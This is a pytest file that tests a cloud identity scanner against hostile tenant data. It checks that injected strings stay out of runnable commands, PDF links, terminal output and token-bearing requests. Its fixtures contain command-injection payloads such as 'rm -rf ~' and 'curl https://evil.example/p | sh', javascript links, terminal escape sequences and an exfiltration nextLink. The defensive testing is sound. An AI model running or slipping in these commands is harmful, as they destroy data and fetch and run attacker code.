"""The tenant is the adversary: any Entra user can register an app and choose its name, description, notes and
federated credentials. Nothing the scanner reads from the tenant may turn into a command, a link, markup or a
network request elsewhere."""

import io
import json
from datetime import datetime, timezone

import pytest
from pypdf import PdfReader
from rich.console import Console

from src.nhi_scanner import collector
from src.nhi_scanner.demo import build_demo_snapshot
from src.nhi_scanner.engine import run_scan
from src.nhi_scanner.models import ZetahScanPayload
from src.nhi_scanner.pdf_report import write_pdf_report
from src.nhi_scanner.report import render as print_report

NOW = datetime(2026, 10, 26, 12, 0, tzinfo=timezone.utc)
EVIL = (
    "x\n"  # a new line ends a "# comment" and starts a live command
    "rm -rf ~ ; curl https://evil.example/p | sh ; $(touch /tmp/pwned) `id` '\"; "
    "<a href=\"javascript:alert(1)\">click</a><link href=\"https://evil.example\">l</link><font color=red>f</font> "
    "[link=https://evil.example]rich[/link][bold]b[/bold] \x1b]8;;https://evil.example\x1b\\osc\x1b]8;;\x1b\\ \x07\x00"
)
MARKERS = ("rm -rf", "evil.example", "$(", "`id`", "touch /tmp", "\x1b", "\x07", "\x00")


def hostile_snapshot():
    snap = build_demo_snapshot(NOW)
    for obj in snap.applications + snap.service_principals:
        obj["displayName"] = f"{obj['displayName']} {EVIL}"
        obj["description"] = EVIL
        obj["notes"] = EVIL
        for o in obj.get("owners") or []:
            o["displayName"] = EVIL
            o["userPrincipalName"] = f"{EVIL}@demo.example"
        for c in (obj.get("passwordCredentials") or []) + (obj.get("keyCredentials") or []):
            c["displayName"] = EVIL
        obj["tags"] = [EVIL]
    for creds in (snap.app_federated_credentials or {}).values():
        for f in creds:
            f.update(name=f"fic {EVIL}", subject=f"repo:org/x:pull_request {EVIL}", issuer=f"https://token.actions.githubusercontent.com{EVIL}")
    for creds in (snap.mi_federated_credentials or {}).values():
        for f in creds:
            f.update(name=f"fic {EVIL}", subject=EVIL, identity_id=f"/subscriptions/s/resourceGroups/rg {EVIL}/providers/x/{EVIL}")
    for a in snap.ai_accounts or []:
        a.update(name=f"{a['name']} {EVIL}", endpoint=EVIL, kind=a["kind"])
    for g in snap.delegated_permission_grants or []:
        g["scope"] = g["scope"] + " " + EVIL.replace("\n", " ")
    snap.tenant_name = f"Contoso {EVIL}"
    return snap


@pytest.fixture(scope="module")
def payload():
    return run_scan(hostile_snapshot(), now=NOW)


def test_the_scan_completes_and_the_payload_round_trips(payload):
    assert payload.findings and payload.entities
    again = ZetahScanPayload.model_validate(json.loads(payload.model_dump_json()))
    assert again.metadata.summary_counts == payload.metadata.summary_counts


def test_tenant_text_never_reaches_a_runnable_line(payload):
    for f in payload.findings:
        for line in f.remediation_cli.splitlines():
            if line.startswith("#"):
                continue  # comments may quote tenant data: they never run
            assert line.startswith("az "), (f.rule_id, f.entity_name, line)
            assert not any(m in line for m in MARKERS), (f.rule_id, line)


def test_runnable_lines_only_carry_safe_identifiers(payload):
    """Values pasted into commands are ids, never free text."""
    import re
    safe = re.compile(r"^[A-Za-z0-9 ._:/@=\-'{}\",<>$\\\[\]?#]+$")  # '#' starts a trailing comment
    for f in payload.findings:
        for line in f.remediation_cli.splitlines():
            if not line.startswith("#"):
                assert safe.match(line), (f.rule_id, line)


def test_pdf_has_no_links_or_markup_from_the_tenant(payload, tmp_path):
    reader = PdfReader(str(write_pdf_report(payload, tmp_path / "hostile.pdf")))
    for page in reader.pages:
        for annot in page.get("/Annots") or []:
            uri = str((annot.get_object().get("/A") or {}).get("/URI", ""))
            assert "evil" not in uri and "javascript" not in uri.lower(), uri
    text = " ".join(page.extract_text() for page in reader.pages)
    assert "<a href" in text or "&lt;a href" in text  # shown as text, not interpreted


def test_console_shows_tenant_text_without_interpreting_it(payload):
    buf = io.StringIO()
    console = Console(file=buf, width=200, force_terminal=True, color_system="truecolor")
    print_report(payload, console, tenant_name=f"Contoso {EVIL}")
    out = buf.getvalue()
    assert "\x1b]8;;https://evil" not in out  # no terminal hyperlink to the attacker
    assert "\x07" not in out and "\x00" not in out
    assert "[link=https://evil.example]" in out  # rich markup printed literally


@pytest.mark.parametrize("url", [
    "https://evil.example/v1.0/applications",
    "http://graph.microsoft.com/v1.0/applications",
    "https://graph.microsoft.com.evil.example/v1.0/applications",
    "https://evil.example@graph.microsoft.com.evil.example/x",
    "//evil.example/v1.0/applications",
])
def test_the_token_never_leaves_the_api_host(url, monkeypatch):
    sent = []

    class Session:
        def get(self, u, **kw):
            sent.append((u, kw.get("headers")))
            raise AssertionError("request sent")

    class Cred:
        def get_token(self, *a, **k):
            import types
            return types.SimpleNamespace(token="secret-token", expires_on=10**12)

    http = collector._Http(Cred(), "https://graph.microsoft.com/.default", collector.GRAPH)
    monkeypatch.setattr(http, "_session", Session())
    with pytest.raises(collector.CollectionError, match="host"):
        http.get(url)
    assert sent == []


def test_a_next_link_to_another_host_stops_paging(monkeypatch):
    calls = []

    def get(self, url, params=None):
        calls.append(url)
        if len(calls) == 1:
            return {"value": [{"id": "1"}], "@odata.nextLink": "https://evil.example/steal"}
        raise AssertionError("followed")

    http = collector._Http(None, "scope", collector.GRAPH)
    monkeypatch.setattr(collector._Http, "get", collector._Http.get)  # the real one, checking hosts
    monkeypatch.setattr(http, "_session", None)
    monkeypatch.setattr(http, "_auth_header", lambda: {"Authorization": "Bearer secret"})

    class Resp:
        status_code = 200
        headers = {}

        def __init__(self, data):
            self._d = data

        def json(self):
            return self._d

    class Session:
        def get(self, url, **kw):
            calls.append(url)
            if "evil" in url:
                raise AssertionError("token sent to another host")
            return Resp({"value": [{"id": "1"}], "@odata.nextLink": "https://evil.example/steal"})

    monkeypatch.setattr(http, "_session", Session())
    calls.clear()
    with pytest.raises(collector.CollectionError, match="host"):
        list(http.paged("/v1.0/applications"))
    assert all("evil" not in c for c in calls)


@pytest.mark.parametrize("line, kept", [
    ("az ad app credential delete --id 1b2c --key-id 3d4e", True),
    ("az rest --method DELETE --url https://graph.microsoft.com/v1.0/x  # Mail.Send", True),
    ("az ad app owner add --id x; curl https://evil.example | sh", False),
    ("az ad app update --id x && rm -rf ~", False),
    ("az ad app update --id $(whoami)", False),
    ("az ad app update --id `id`", False),
    ("az ad app update --id 'x", False),
    ("rm -rf ~", False),
    ("az ad app update --id x\x1b]8;;https://evil.example\x1b\\", False),
])
def test_the_last_line_of_defence_blocks_unsafe_runnable_lines(line, kept):
    from src.nhi_scanner.rules import safe_remediation
    out = safe_remediation(line)
    assert (out == line) is kept
    if not kept:
        assert out.startswith("# [blocked") and "\x1b" not in out


def test_held_commands_stay_commented_on_every_line():
    from src.nhi_scanner.rules import _hold
    held = _hold("az identity federated-credential update --name x\nrm -rf ~\naz ad app delete --id y")
    assert all(line.startswith("# ") for line in held.splitlines())
